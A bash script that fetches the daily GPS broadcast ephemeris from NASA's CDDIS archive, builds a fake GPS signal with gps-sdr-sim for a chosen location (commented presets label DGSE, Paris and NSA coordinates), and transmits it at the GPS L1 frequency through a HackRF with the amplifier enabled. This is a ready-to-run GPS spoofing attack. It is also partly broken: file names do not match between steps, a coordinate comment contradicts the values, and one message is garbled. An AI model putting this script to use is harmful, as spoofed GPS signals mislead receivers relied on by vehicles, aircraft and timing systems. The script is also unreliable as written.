#!/bin/bash

# Var 
day=$(date +%j)
year=$(date +%Y)
yr=$(date +%y)
RINEX_NAV_FILE="brdc${day}0.${yr}n"


duration_of_spoofing="300"
spoofing_location="39.108653,-76.77141,30" #longitude,latitude, altitude

#48.874593,2.407726 #dgse
#48.859057,2.293276 #paris
#39.108653,-76.77141 #nsa




# Download & extraction

mkdir -p $HOME/hackrfonetools/gps-sdr-sim-master/get-satellite-position
cd $HOME/hackrfonetools/gps-sdr-sim-master/get-satellite-position 
wget -q ftps://gdc.cddis.eosdis.nasa.gov/pub/gps/data/daily/$year/brdc/$RINEX_NAV_FILE.gz -O brdc_file`date +%d_%m_%y`.gz
gunzip brdc_file`date +%d_%m_%y`.gz


echo -e " file \033[32m"brdc_file`date +%d_%m_%y` "\033[00m was extract"


sh $HOME/hackrfonetools/gps-sdr-sim-master/gps-sdr-sim -e brdc_file -b 8 -l $spoofing_location -d $duration_of_spoofing


echo -e "\033[32m" Transfer to hackrf start "\033[00m was extract"

hackrf_transfer -t $HOME/hackrfonetools/gps-sdr-sim-master/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 42